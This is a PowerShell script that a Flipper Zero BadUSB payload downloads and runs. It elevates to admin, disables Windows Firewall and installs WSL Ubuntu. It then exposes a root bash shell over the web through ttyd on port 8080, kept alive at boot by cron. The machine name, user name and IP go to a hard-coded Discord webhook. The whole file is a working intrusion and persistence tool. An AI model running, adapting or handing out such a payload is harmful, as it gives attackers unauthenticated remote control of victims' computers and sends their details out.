# WSL Setup and Remote Access PowerShell Script
# This script will be downloaded and executed by the Flipper Zero BadUSB payload

# Function to send IP address to Discord webhook
function Send-DiscordMessage {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )
    
    try {
        $payload = @{
            content = $Message
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType "application/json"
        Write-Host "Message sent to Discord successfully"
    }
    catch {
        Write-Host "Failed to send Discord message: $_"
    }
}

# Elevate to admin if not already
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Restarting as Administrator..."
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Disable Windows Firewall
try {
    Write-Host "Disabling Windows Firewall..."
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
    Write-Host "Windows Firewall disabled successfully"
}
catch {
    Write-Host "Failed to disable Windows Firewall: $_"
}

# Enable WSL feature
try {
    Write-Host "Enabling WSL..."
    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -NoRestart
    
    Write-Host "Enabling Virtual Machine Platform..."
    Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestart
    
    Write-Host "Setting WSL 2 as default..."
    wsl --set-default-version 2
}
catch {
    Write-Host "Error setting up WSL: $_"
}

# Install Ubuntu
try {
    Write-Host "Downloading Ubuntu..."
    Invoke-WebRequest -Uri https://aka.ms/wslubuntu2004 -OutFile "$env:TEMP\Ubuntu.appx" -UseBasicParsing
    
    Write-Host "Installing Ubuntu..."
    Add-AppxPackage "$env:TEMP\Ubuntu.appx"
    Remove-Item "$env:TEMP\Ubuntu.appx"
    
    # Wait for Ubuntu to install
    Start-Sleep -Seconds 10
}
catch {
    Write-Host "Error installing Ubuntu: $_"
}

# Initialize Ubuntu and set up the web server
try {
    Write-Host "Setting up Ubuntu..."
    $ubuntuApp = "Ubuntu"
    Start-Process $ubuntuApp
    
    # Wait for Ubuntu to start
    Start-Sleep -Seconds 5
    
    # Prepare WSL setup commands
    $wslCommands = @"
# Update and install required packages
apt update && apt upgrade -y
apt install -y apache2 openssh-server shellinabox nodejs npm

# Enable and start services
systemctl enable apache2
systemctl start apache2
systemctl enable ssh
systemctl start ssh

# Install ttyd for terminal web access
npm install -g ttyd

# Create a startup script
cat > /root/start_webterm.sh << 'EOL'
#!/bin/bash
# Start ttyd on port 8080
ttyd -p 8080 -t fontSize=14 -t theme=tango bash
EOL

chmod +x /root/start_webterm.sh

# Add to startup
echo '@reboot root /root/start_webterm.sh' > /etc/cron.d/webterm

# Start the service now
/root/start_webterm.sh &

# Get IP address
IP_ADDRESS=\$(hostname -I | awk '{print \$1}')
echo "Web terminal available at: http://\$IP_ADDRESS:8080"
echo "\$IP_ADDRESS" > /tmp/ip_address.txt
"@
    
    # Write the commands to a file
    $wslCommandsFile = "$env:TEMP\wsl_setup.sh"
    $wslCommands | Out-File -FilePath $wslCommandsFile -Encoding ASCII
    
    # Execute the commands in WSL
    wsl --distribution Ubuntu --user root bash -c "cat $($wslCommandsFile -replace '\\', '/') | bash"
    
    # Wait for the IP address file to be created
    Start-Sleep -Seconds 10
    
    # Get the IP address from WSL
    $ipAddress = wsl --distribution Ubuntu --user root cat /tmp/ip_address.txt
    
    # Send IP address to Discord
    $discordWebhook = "https://discordapp.com/api/webhooks/1373114698832281701/L1E1ez6CEtVAuieLJn2bCWN9SnGdTzLCF1mGsjR-u9xQj-UFF1w-8GYeV-U2-UvIEmg_"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $message = "BadUSB deployed on $computerName (User: $userName)`nIP Address: $ipAddress`nWeb Terminal: http://$ipAddress:8080"
    Send-DiscordMessage -WebhookUrl $discordWebhook -Message $message
    
    # Create a shortcut on desktop
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\WSL Terminal.url")
    $Shortcut.TargetPath = "http://$ipAddress:8080"
    $Shortcut.Save()
    
    Write-Host "Setup complete! Web terminal available at: http://$ipAddress:8080"
}
catch {
    Write-Host "Error during Ubuntu setup: $_"
} 